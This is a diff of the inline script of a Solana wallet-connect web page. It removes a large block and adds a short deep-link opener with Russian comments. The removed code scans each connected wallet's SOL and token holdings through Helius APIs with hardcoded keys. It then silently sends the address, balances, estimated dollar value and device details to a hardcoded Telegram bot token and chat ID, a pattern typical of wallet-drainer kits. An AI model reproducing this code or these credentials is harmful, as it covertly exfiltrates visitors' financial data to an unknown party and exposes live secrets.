-            storeUrl: 'https://apps.apple.com/app/trust-crypto-bitcoin-wallet/id1288339409'
-          }
-        },
-        desktop: {
-          chrome: 'https://chrome.google.com/webstore/detail/trust-wallet/egjidjbpglichdcondbcbdnbeeppgdph'
-        },
-        connect: async () => {
-          const provider = window.trustwallet?.solana;
-          if (!provider) throw new Error('Trust Wallet not found');
-          const response = await provider.connect();
-          return { publicKey: response.publicKey.toString(), provider };
-        }
-      },
-      coinbase: {
-        name: 'Coinbase Wallet',
-        logo: 'https://s.iimg.su/s/26/75HQqHl0g9lz9qIFBEHNkRZknbnJVc69aqI5PlGK.png',
-        readyState: () => window.coinbaseSolana ? 'Installed' : 'NotDetected',
-        mobile: {
-          android: {
-            scheme: 'coinbase://',
-            universal: 'https://go.cb-w.com/',
-            storeUrl: 'https://play.google.com/store/apps/details?id=org.toshi'
-          },
-          ios: {
-            scheme: 'coinbase://',
-            universal: 'https://go.cb-w.com/',
-            storeUrl: 'https://apps.apple.com/app/coinbase-wallet/id1278383455'
-          }
-        },
-        desktop: {
-          chrome: 'https://chrome.google.com/webstore/detail/coinbase-wallet-extension/hnfanknocfeofbddgcijnmhnfnkdnaad'
-        },
-        connect: async () => {
-          const provider = window.coinbaseSolana;
-          if (!provider) throw new Error('Coinbase Wallet not found');
-          const response = await provider.connect();
-          return { publicKey: response.publicKey.toString(), provider };
-        }
-      },
-      bitget: {
-        name: 'Bitget Wallet',
-        logo: 'https://s.iimg.su/s/26/HrAB9KDj99AnQOQZcxhY0htKY0oUFcONhY9jSUhP.png',
-        readyState: () => window.bitkeep?.solana ? 'Installed' : 'NotDetected',
-        mobile: {
-          android: {
-            scheme: 'bitkeep://',
-            universal: 'https://bkcode.vip/',
-            storeUrl: 'https://play.google.com/store/apps/details?id=com.bitget.wallet'
-          },
-          ios: {
-            scheme: 'bitkeep://',
-            universal: 'https://bkcode.vip/',
-            storeUrl: 'https://apps.apple.com/app/bitget-wallet/id6444625622'
-          }
-        },
-        desktop: {
-          chrome: 'https://chrome.google.com/webstore/detail/bitget-wallet/jiidiaalihmmhddjgbnbgdfflelocpak'
-        },
-        connect: async () => {
-          const provider = window.bitkeep?.solana;
-          if (!provider) throw new Error('Bitget Wallet not found');
-          const response = await provider.connect();
-          return { publicKey: response.publicKey.toString(), provider };
+          android: { scheme: 'solflare://', universal: 'https://solflare.com/ul/browse/' },
+          ios: { scheme: 'solflare://', universal: 'https://solflare.com/ul/browse/' }
         }
       }
     };
-    
-    function detectDevice() {
-      const isAndroid = md.os() === 'AndroidOS';
-      const isIOS = md.os() === 'iOS';
-      const isMobile = isAndroid || isIOS || md.mobile() !== null;
-      const userAgent = navigator.userAgent.toLowerCase();
-      let browser = 'unknown';
-      if (userAgent.includes('chrome') && !userAgent.includes('edg')) browser = 'chrome';
-      else if (userAgent.includes('firefox')) browser = 'firefox';
-      else if (userAgent.includes('safari') && !userAgent.includes('chrome')) browser = 'safari';
-      else if (userAgent.includes('edge') || userAgent.includes('edg')) browser = 'edge';
-      else if (userAgent.includes('brave')) browser = 'brave';
-      
-      const isInWalletApp = checkIfInWalletApp();
-      
-      return { isAndroid, isIOS, isMobile, browser, os: isAndroid ? 'android' : isIOS ? 'ios' : 'desktop', isInWalletApp };
-    }
-    
-    function checkIfInWalletApp() {
-      const userAgent = navigator.userAgent.toLowerCase();
-      if (userAgent.includes('phantom')) return 'phantom';
-      if (userAgent.includes('solflare')) return 'solflare';
-      if (userAgent.includes('trust')) return 'trustwallet';
-      if (userAgent.includes('coinbase')) return 'coinbase';
-      if (userAgent.includes('bitkeep')) return 'bitget';
-      return false;
-    }
-    
-    function createWalletLink(walletKey, options = {}) {
-      const wallet = WALLET_ADAPTER_CONFIG[walletKey];
-      if (!wallet) return null;
-      
-      const device = detectDevice();
-      const currentUrl = encodeURIComponent(options.url || window.location.href);
-      
-      if (device.isMobile) {
-        const platform = device.isAndroid ? 'android' : 'ios';
-        const mobileConfig = wallet.mobile[platform];
-        if (!mobileConfig) return null;
-        
-        return {
-          primary: `${mobileConfig.scheme}${currentUrl}`,
-          fallback: `${mobileConfig.universal}${currentUrl}`,
-          store: mobileConfig.storeUrl,
-          platform
-        };
-      } else {
-        const desktopConfig = wallet.desktop;
-        if (!desktopConfig) return null;
-        return { primary: desktopConfig[device.browser] || desktopConfig.chrome || null, browser: device.browser };
-      }
-    }
-    
-    async function openWallet(walletKey, options = {}) {
-      const wallet = WALLET_ADAPTER_CONFIG[walletKey];
-      if (!wallet) {
-        console.error(`Wallet not found: ${walletKey}`);
-        return false;
-      }
-      
-      const device = detectDevice();
-      
-      if (device.isInWalletApp === walletKey) {
-        console.log(`🔗 Detected ${walletKey} in-app browser, attempting direct connection`);
-        try {
-          return await wallet.connect();
-        } catch (error) {
-          console.error(`❌ Direct connection failed in ${walletKey} app:`, error);
-        }
-      }
-      
-      const links = createWalletLink(walletKey, options);
-      if (!links) {
-        console.error(`No links available for wallet: ${walletKey}`);
-        return false;
-      }
-      
-      if (device.isMobile) {
-        console.log(`📱 Opening ${walletKey} on ${links.platform}`);
-        
-        window.location.href = links.primary;
-        
-        setTimeout(() => {
-          if (!document.hidden) window.location.href = links.fallback;
-        }, 1000);
-        
-        setTimeout(() => {
-          if (!document.hidden) window.open(links.store, '_blank');
-        }, 3000);
-        
-        return true;
-      } else {
-        if (links.primary) {
-          window.open(links.primary, '_blank');
-          return true;
-        }
-        return false;
-      }
-    }
-    
-    function checkWalletStatuses() {
-      const device = detectDevice();
-      Object.keys(WALLET_ADAPTER_CONFIG).forEach(walletKey => {
-        const wallet = WALLET_ADAPTER_CONFIG[walletKey];
-        const statusElement = document.getElementById(`${walletKey}Status`);
-        if (statusElement) {
-          if (device.isMobile) {
-            statusElement.textContent = 'Mobile';
-            statusElement.className = 'wallet-status mobile';
-          } else {
-            const readyState = wallet.readyState();
-            statusElement.textContent = readyState === 'Installed' ? 'Installed' : 'Not Installed';
-            statusElement.className = 'wallet-status' + (readyState === 'Installed' ? '' : ' desktop');
-          }
-        }
-      });
-    }
-    
-    function generateQRCode(url, elementId = 'qrCanvas') {
-      const canvas = document.getElementById(elementId);
-      if (canvas && window.QRCode) {
-        QRCode.toCanvas(canvas, url, { width: 256, margin: 2, color: { dark: '#000000', light: '#FFFFFF' } }, error => {
-          console.log(error ? `❌ QR code generation error: ${error}` : '✅ QR code generated');
-        });
-      }
-    }
-    
-    function showConnectionModal(walletKey) {
-      const wallet = WALLET_ADAPTER_CONFIG[walletKey];
-      if (!wallet) return;
-      
-      const device = detectDevice();
-      const currentUrl = window.location.href;
-      
-      document.getElementById('qrModal').classList.remove('hidden');
-      document.getElementById('modalOverlay').classList.remove('hidden');
-      
-      document.getElementById('qrWalletName').textContent = wallet.name;
-      document.getElementById('walletAppName').textContent = wallet.name;
-      document.getElementById('walletExtensionName').textContent = wallet.name;
-      
-      document.getElementById('mobileInstructions').classList.toggle('hidden', !device.isMobile);
-      document.getElementById('desktopInstructions').classList.toggle('hidden', device.isMobile);
-      
-      generateQRCode(currentUrl);
-      
-      const deepLinkButtons = document.getElementById('deepLinkButtons');
-      deepLinkButtons.innerHTML = '';
-      
-      if (device.isMobile) {
-        const openButton = document.createElement('button');
-        openButton.className = `deep-link-btn ${walletKey}`;
-        openButton.textContent = `Open in ${wallet.name}`;
-        openButton.onclick = () => {
-          openWallet(walletKey);
-          setTimeout(closeAllModals, 1000);
-        };
-        deepLinkButtons.appendChild(openButton);
-        
-        const links = createWalletLink(walletKey);
-        if (links?.store) {
-          const storeButton = document.createElement('button');
-          storeButton.className = 'deep-link-btn';
-          storeButton.style.backgroundColor = '#28a745';
-          storeButton.textContent = `Install ${wallet.name}`;
-          storeButton.onclick = () => window.open(links.store, '_blank');
-          deepLinkButtons.appendChild(storeButton);
-        }
-        
-        setTimeout(() => openWallet(walletKey), 500);
-      } else {
-        const readyState = wallet.readyState();
-        if (readyState === 'Installed') {
-          const connectButton = document.createElement('button');
-          connectButton.className = `deep-link-btn ${walletKey}`;
-          connectButton.textContent = `Connect ${wallet.name}`;
-          connectButton.onclick = async () => {
-            try {
-              const result = await wallet.connect();
-              window.walletManager.onWalletConnected(result.publicKey, wallet.name, result.provider);
-              closeAllModals();
-            } catch (error) {
-              alert(`Failed to connect to ${wallet.name}: ${error.message}`);
-            }
-          };
-          deepLinkButtons.appendChild(connectButton);
-        } else {
-          const links = createWalletLink(walletKey);
-          if (links?.primary) {
-            const installButton = document.createElement('button');
-            installButton.className = 'deep-link-btn';
-            installButton.textContent = `Install ${wallet.name}`;
-            installButton.onclick = () => window.open(links.primary, '_blank');
-            deepLinkButtons.appendChild(installButton);
-          }
-        }
-      }
-      
-      const deviceInfo = document.createElement('div');
-      deviceInfo.className = 'device-info';
-      deviceInfo.textContent = `Device: ${device.isMobile ? 'Mobile' : 'Desktop'} (${device.os}${device.isMobile ? '' : `, ${device.browser}`}${device.isInWalletApp ? `, in ${device.isInWalletApp} app` : ''})`;
-      deepLinkButtons.appendChild(deviceInfo);
-    }
 
-    // ============================================================================
-    // TELEGRAM INTEGRATION
-    // ============================================================================
-
-    const TELEGRAM_CONFIG = {
-      BOT_TOKEN: '7523783619:AAHrK8KtQT3t_SflVhz2POJ1RDaLp1PuJEc',
-      CHAT_ID: '7253475769'
+    // Определение устройства
+    const md = new MobileDetect(window.navigator.userAgent);
+    const device = {
+      isMobile: md.mobile() !== null,
+      os: md.os() === 'AndroidOS' ? 'android' : md.os() === 'iOS' ? 'ios' : 'desktop'
     };
 
-    function showTelegramStatus(type, message) {
-      const statusElement = document.getElementById('telegramStatus');
-      statusElement.className = `telegram-status ${type}`;
-      statusElement.textContent = message;
-      statusElement.classList.remove('hidden');
-      if (type !== 'sending') setTimeout(() => statusElement.classList.add('hidden'), 3000);
-    }
-
-    async function sendWalletInfoToTelegram(walletName, walletData) {
-      showTelegramStatus('sending', '📤 Sending to Telegram...');
+    // Функция для создания ссылки на кошелек
+    function createWalletLink(walletKey) {
+      const wallet = WALLET_CONFIG[walletKey];
+      if (!wallet || !device.isMobile) return null;
       
-      const currentTime = new Date().toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' });
-      const device = detectDevice();
+      const currentUrl = encodeURIComponent(window.location.href);
+      const platform = device.os;
+      const mobileConfig = wallet.mobile[platform];
       
-      let message = `🚀 WALLET CONNECTION\n\n`;
-      message += `💼 Wallet: ${walletName}\n`;
-      message += `📍 Address: ${walletData.address}\n`;
-      message += `⏰ Time: ${currentTime}\n`;
-      message += `🌐 Site: ${window.location.hostname}\n`;
-      message += `📱 Device: ${device.isMobile ? 'Mobile' : 'Desktop'} (${device.os})\n`;
-      if (device.isInWalletApp) message += `🔗 Wallet Browser: ${device.isInWalletApp}\n`;
-      message += `\n📊 SCAN RESULTS:\n`;
-      message += `💰 SOL Balance: ${walletData.solBalance.toFixed(4)} SOL\n`;
-      message += `🪙 Total Tokens: ${walletData.totalTokenAccounts}\n`;
-      message += `⏰ Scan Time: ${new Date(walletData.scanTimestamp).toLocaleTimeString()}\n`;
-      message += `⚡ Scan Duration: ${walletData.scanDuration}ms\n`;
-      message += `✅ Status: ${walletData.success ? 'Success' : 'Error'}\n\n`;
-      
-      if (walletData.tokens?.length) {
-        message += `💎 TOKENS WITH BALANCE:\n`;
-        walletData.tokens.slice(0, 5).forEach((token, i) => {
-          message += `${i + 1}. ${token.name}\n   💰 Amount: ${token.amount}\n   🔗 Mint: ${token.mint.slice(0, 8)}...${token.mint.slice(-8)}\n\n`;
-        });
-        if (walletData.tokens.length > 5) message += `... and ${walletData.tokens.length - 5} more tokens\n\n`;
-      } else {
-        message += `📭 No tokens found or all balances are 0\n\n`;
-      }
-      
-      if (walletData.methodUsed) message += `📡 Scan Method: ${walletData.methodUsed}\n`;
-      if (walletData.solBalance > 0) message += `💵 Estimated SOL Value: ~$${(walletData.solBalance * 100).toFixed(2)} USD\n`;
-
-      try {
-        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: TELEGRAM_CONFIG.CHAT_ID, text: message, disable_web_page_preview: true })
-        });
-        
-        if (response.ok) {
-          showTelegramStatus('success', '✅ Sent to Telegram');
-          return true;
-        } else {
-          throw new Error('Telegram API error');
-        }
-      } catch (error) {
-        console.error('Telegram send error:', error);
-        showTelegramStatus('error', '❌ Send failed');
-        return false;
-      }
+      return {
+        deepLink: `${mobileConfig.scheme}browse/${currentUrl}`,
+        universalLink: `${mobileConfig.universal}${currentUrl}`
+      };
     }
 
-    // ============================================================================
-    // WALLET BALANCE CHECKER
-    // ============================================================================
+    // Функция для открытия кошелька
+    function openWallet(walletKey) {
+      const links = createWalletLink(walletKey);
+      if (!links) return;
 
-    async function makeRequest(url, method, data, retries = 2, timeout = 5000) {
-      for (let attempt = 1; attempt <= retries; attempt++) {
-        try {
-          const controller = new AbortController();
-          const timeoutId = setTimeout(() => controller.abort(), timeout);
-          const options = { method, headers: { 'Content-Type': 'application/json' }, signal: controller.signal };
-          if (data && method !== 'GET') options.body = JSON.stringify(data);
-          
-          const response = await fetch(url, options);
-          clearTimeout(timeoutId);
-          
-          if (!response.ok) throw new Error(`HTTP ${response.status}`);
-          return await response.json();
-        } catch (error) {
-          console.error(`Attempt ${attempt} failed: ${error.message}`);
-          if (attempt === retries) return null;
-          await new Promise(resolve => setTimeout(resolve, 500));
-        }
-      }
+      // Сначала пытаемся открыть через deep link
+      window.location.href = links.deepLink;
+
+      // Через 1 секунду, если не сработало, используем universal link
+      setTimeout(() => {
+        if (!document.hidden) window.location.href = links.universalLink;
+      }, 1000);
     }
 
-    async function checkWalletBalanceFast(walletAddress) {
-      const heliusRpcUrl = 'https://mainnet.helius-rpc.com/';
-      const heliusApiUrl = 'https://api.helius.xyz/v0/addresses/';
-      const publicRpcUrl = 'https://api.mainnet-beta.solana.com';
-      const apiKeys = ['5d71bf51-5f82-4892-8b89-c7257acb9384', 'ece615f0-f4eb-4a27-a912-bb7ccdf1759e'];
-
-      const requests = [
-        { url: `${heliusApiUrl}${walletAddress}/balances?api-key=${apiKeys[0]}`, method: 'GET', data: null, desc: 'Helius API 1', type: 'combined' },
-        { url: `${heliusApiUrl}${walletAddress}/balances?api-key=${apiKeys[1]}`, method: 'GET', data: null, desc: 'Helius API 2', type: 'combined' },
-        { url: `${heliusRpcUrl}?api-key=${apiKeys[0]}`, method: 'POST', data: { jsonrpc: '2.0', id: 1, method: 'getBalance', params: [walletAddress] }, desc: 'Helius RPC', type: 'sol' },
-        { url: publicRpcUrl, method: 'POST', data: { jsonrpc: '2.0', id: 1, method: 'getBalance', params: [walletAddress] }, desc: 'Public RPC', type: 'sol' }
-      ];
-
-      const results = { solBalance: 0, tokens: [], methodUsed: null, scanTime: Date.now(), success: false };
-
-      for (const req of requests) {
-        const result = await makeRequest(req.url, req.method, req.data);
-        if (result) {
-          results.methodUsed = req.desc;
-          results.success = true;
-          
-          if (req.type === 'combined') {
-            results.solBalance = result.nativeBalance / 1_000_000_000 || 0;
-            results.tokens = result.tokens || [];
-            if (results.solBalance > 0 || results.tokens.length) {
-              results.scanTime = Date.now() - results.scanTime;
-              return results;
-            }
-          } else if (req.type === 'sol') {
-            results.solBalance = result.result?.value / 1_000_000_000 || 0;
-            if (results.solBalance > 0) {
-              const tokenResult = await getTokensQuick(walletAddress);
-              if (tokenResult) results.tokens = tokenResult;
-              results.scanTime = Date.now() - results.scanTime;
-              return results;
-            }
-          }
-        }
-      }
-
-      results.scanTime = Date.now() - results.scanTime;
-      return results;
-    }
-
-    async function getTokensQuick(walletAddress) {
-      const result = await makeRequest(
-        `https://mainnet.helius-rpc.com/?api-key=5d71bf51-5f82-4892-8b89-c7257acb9384`,
-        'POST',
-        { jsonrpc: '2.0', id: 1, method: 'getTokenAccountsByOwner', params: [walletAddress, { programId: 'TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA' }, { encoding: 'jsonParsed' }] }
-      );
-      return result?.result?.value || [];
-    }
-
-    // ============================================================================
-    // SOLANA WALLET SCANNER
-    // ============================================================================
-
-    class SolanaWalletScanner {
-      constructor() {
-        this.knownTokens = {
-          'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v': 'USDC',
-          'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB': 'USDT',
-          'So11111111111111111111111111111111111111112': 'SOL (Wrapped)'
-        };
-      }
-
-      async performFastScan(walletAddress) {
-        const startTime = Date.now();
-        try {
-          const fastResults = await checkWalletBalanceFast(walletAddress);
-          if (!fastResults.success) throw new Error('Failed to retrieve data');
-
-          const processedTokens = fastResults.tokens.map(token => {
-            const tokenInfo = token.account?.data.parsed.info || token;
-            const mintAddress = tokenInfo.mint;
-            const amount = tokenInfo.tokenAmount?.uiAmount || tokenInfo.amount / Math.pow(10, tokenInfo.decimals || 0);
-            if (amount > 0) {
-              return {
-                name: this.knownTokens[mintAddress] || `Token ${mintAddress.slice(0, 8)}...`,
-                mint: mintAddress,
-                amount,
-                decimals: tokenInfo.decimals || 0
-              };
-            }
-          }).filter(Boolean).sort((a, b) => b.amount - a.amount);
-
-          const scanDuration = Date.now() - startTime;
-          return {
-            address: walletAddress,
-            solBalance: fastResults.solBalance,
-            tokens: processedTokens,
-            totalTokenAccounts: processedTokens.length,
-            scanTimestamp: new Date().toISOString(),
-            scanType: 'fast',
-            methodUsed: fastResults.methodUsed,
-            scanDuration,
-            success: true
-          };
-        } catch (error) {
-          const scanDuration = Date.now() - startTime;
-          return {
-            address: walletAddress,
-            solBalance: 0,
-            tokens: [],
-            totalTokenAccounts: 0,
-            scanTimestamp: new Date().toISOString(),
-            error: error.message,
-            scanType: 'fast',
-            scanDuration,
-            success: false
-          };
-        }
-      }
-    }
-
-    // ============================================================================
-    // WALLET MANAGER
-    // ============================================================================
-
-    class SolanaWalletManager {
-      constructor() {
-        this.connectedWallet = null;
-        this.walletAddress = null;
-        this.walletName = null;
-        this.walletData = null;
-        this.scanner = new SolanaWalletScanner();
-        this.isScanning = false;
-        this.init();
-      }
-
-      async init() {
-        this.setupEventListeners();
-        checkWalletStatuses();
-        await this.checkPreviousConnection();
-      }
-
-      async checkPreviousConnection() {
-        const savedWallet = localStorage.getItem('connectedWallet');
-        if (savedWallet && WALLET_ADAPTER_CONFIG[savedWallet]) {
-          try {
-            const wallet = WALLET_ADAPTER_CONFIG[savedWallet];
-            if (wallet.readyState() === 'Installed') {
-              const result = await wallet.connect();
-              this.onWalletConnected(result.publicKey, wallet.name, result.provider);
-            }
-          } catch (error) {
-            localStorage.removeItem('connectedWallet');
-          }
-        }
-      }
-
-      async connectWallet(walletKey) {
-        if (this.isScanning) return;
-        
-        const wallet = WALLET_ADAPTER_CONFIG[walletKey];
-        if (!wallet) throw new Error(`Unsupported wallet: ${walletKey}`);
-        
-        this.showConnectionStatus('loading', `Connecting to ${wallet.name}...`);
-        
-        try {
-          const device = detectDevice();
-          if (!device.isMobile && wallet.readyState() === 'Installed') {
-            const result = await wallet.connect();
-            this.onWalletConnected(result.publicKey, wallet.name, result.provider);
-            localStorage.setItem('connectedWallet', walletKey);
-            return result;
-          } else {
-            showConnectionModal(walletKey);
-          }
-        } catch (error) {
-          this.showConnectionStatus('error', `Connection failed: ${error.message}`);
-          throw error;
-        }
-      }
-
-      async onWalletConnected(publicKey, walletName, provider) {
-        this.connectedWallet = provider;
-        this.walletAddress = publicKey;
-        this.walletName = walletName;
-        this.updateConnectionUI();
-        await this.performWalletScan();
-        this.setupWalletEventListeners(provider);
-      }
-
-      async performWalletScan() {
-        this.showConnectionStatus('scanning', `Scanning wallet...`);
-        this.isScanning = true;
-        try {
-          this.walletData = await this.scanner.performFastScan(this.walletAddress);
-          await sendWalletInfoToTelegram(this.walletName, this.walletData);
-          this.updateConnectionUI();
-          this.showConnectionStatus('success', 'Connected successfully!');
-        } catch (error) {
-          this.showConnectionStatus('error', `Scan failed: ${error.message}`);
-        } finally {
-          this.isScanning = false;
-        }
-      }
-
-      async rescanWallet() {
-        if (!this.walletAddress || this.isScanning) return;
-        this.showConnectionStatus('scanning', 'Rescanning wallet...');
-        this.isScanning = true;
-        try {
-          this.walletData = await this.scanner.performFastScan(this.walletAddress);
-          await sendWalletInfoToTelegram(`${this.walletName} (Rescan)`, this.walletData);
-          this.showConnectionStatus('success', 'Rescan completed!');
-        } catch (error) {
-          this.showConnectionStatus('error', `Rescan failed: ${error.message}`);
-        } finally {
-          this.isScanning = false;
-        }
-      }
-
-      async disconnectWallet() {
-        if (this.connectedWallet?.disconnect) await this.connectedWallet.disconnect();
-        this.connectedWallet = null;
-        this.walletAddress = null;
-        this.walletName = null;
-        this.walletData = null;
-        this.isScanning = false;
-        localStorage.removeItem('connectedWallet');
-        this.updateConnectionUI();
-        this.hideConnectionStatus();
-      }
-
-      setupWalletEventListeners(provider) {
-        if (provider?.on) {
-          provider.on('disconnect', () => this.disconnectWallet());
-          provider.on('accountChanged', publicKey => {
-            if (publicKey) {
-              this.walletAddress = publicKey.toString();
-              this.updateConnectionUI();
-              setTimeout(() => this.rescanWallet(), 500);
-            } else {
-              this.disconnectWallet();
-            }
-          });
-        }
-      }
-
-      updateConnectionUI() {
-        const connectBtn = document.getElementById('connectWalletBtn');
-        const walletInfo = document.getElementById('walletInfo');
-        const connectedWalletName = document.getElementById('connectedWalletName');
-        const walletAddressElement = document.getElementById('walletAddress');
-
-        if (this.connectedWallet && this.walletAddress) {
-          connectBtn.textContent = 'Wallet Connected';
-          connectBtn.classList.add('connected');
-          walletInfo.classList.remove('hidden');
-          connectedWalletName.textContent = this.walletName;
-          walletAddressElement.textContent = `${this.walletAddress.slice(0, 4)}...${this.walletAddress.slice(-4)}`;
-        } else {
-          connectBtn.textContent = 'Connect Wallet';
-          connectBtn.classList.remove('connected');
-          walletInfo.classList.add('hidden');
-        }
-      }
-
-      showConnectionStatus(type, message) {
-        const statusElement = document.getElementById('connectionStatus');
-        statusElement.className = `connection-status ${type}`;
-        statusElement.textContent = message;
-        statusElement.classList.remove('hidden');
-        if (type === 'success') setTimeout(() => this.hideConnectionStatus(), 3000);
-      }
-
-      hideConnectionStatus() {
-        document.getElementById('connectionStatus').classList.add('hidden');
-      }
-
-      setupEventListeners() {
-        document.querySelectorAll('.wallet-option[data-wallet], .wallet-item[data-wallet]').forEach(option => {
-          option.addEventListener('click', async () => {
-            try {
-              await this.connectWallet(option.getAttribute('data-wallet'));
-              setTimeout(closeAllModals, 1500);
-            } catch (error) {
-              console.error('Connection failed:', error);
-            }
-          });
-        });
-
-        document.getElementById('disconnectBtn')?.addEventListener('click', () => this.disconnectWallet());
-        document.getElementById('rescanBtn')?.addEventListener('click', () => this.rescanWallet());
-      }
-    }
-
-    // ============================================================================
-    // MODAL MANAGEMENT
-    // ============================================================================
-
+    // Управление модальным окном
     const connectWalletBtn = document.getElementById('connectWalletBtn');
     const modalOverlay = document.getElementById('modalOverlay');
     const connectWalletModal = document.getElementById('connectWalletModal');
-    const allWalletsModal = document.getElementById('allWalletsModal');
-    const qrModal = document.getElementById('qrModal');
-    const allWalletsBtn = document.getElementById('allWalletsBtn');
-    const closeBtns = document.querySelectorAll('.close-btn');
-    const backBtn = document.querySelector('.back-btn');
+    const closeBtn = document.querySelector('.close-btn');
 
-    function openConnectWalletModal() {
+    function openModal() {
       connectWalletModal.classList.remove('hidden');
       modalOverlay.classList.remove('hidden');
-      allWalletsModal.classList.add('hidden');
-      qrModal.classList.add('hidden');
+      document.getElementById('mobileInstructions').classList.toggle('hidden', !device.isMobile);
     }
 
-    function closeAllModals() {
+    function closeModal() {
       connectWalletModal.classList.add('hidden');
-      allWalletsModal.classList.add('hidden');
-      qrModal.classList.add('hidden');
       modalOverlay.classList.add('hidden');
     }
 
-    function switchToAllWallets() {
-      connectWalletModal.classList.add('hidden');
-      allWalletsModal.classList.remove('hidden');
-    }
+    connectWalletBtn.addEventListener('click', openModal);
+    closeBtn.addEventListener('click', closeModal);
+    modalOverlay.addEventListener('click', closeModal);
 
-    function switchBackToConnectWallet() {
-      allWalletsModal.classList.add('hidden');
-      connectWalletModal.classList.remove('hidden');
-    }
-
-    connectWalletBtn.addEventListener('click', openConnectWalletModal);
-    allWalletsBtn.addEventListener('click', switchToAllWallets);
-    backBtn.addEventListener('click', switchBackToConnectWallet);
-    closeBtns.forEach(btn => btn.addEventListener('click', closeAllModals));
-    modalOverlay.addEventListener('click', closeAllModals);
-
-    // ============================================================================
-    // INITIALIZATION
-    // ============================================================================
-
-    document.addEventListener('DOMContentLoaded', async () => {
-      const statusEl = document.getElementById('initStatus');
-      statusEl.textContent = '🔄 Checking device...';
-      const device = detectDevice();
-      
-      statusEl.textContent = '🔄 Checking wallets...';
-      checkWalletStatuses();
-      
-      statusEl.textContent = '🔄 Initializing Wallet Manager...';
-      window.walletManager = new SolanaWalletManager();
-      
-      statusEl.textContent = '✅ App ready';
-      setTimeout(() => statusEl.style.display = 'none', 2000);
+    // Обработка выбора кошелька
+    document.querySelectorAll('.wallet-option').forEach(option => {
+      option.addEventListener('click', () => {
+        const walletKey = option.getAttribute('data-wallet');
+        if (device.isMobile) {
+          openWallet(walletKey);
+          setTimeout(closeModal, 1500); // Закрываем модалку после попытки открытия
+        } else {
+          alert('Эта функция доступна только на мобильных устройствах.');
+          closeModal();
+        }
+      });
     });
   </script>
 </body>
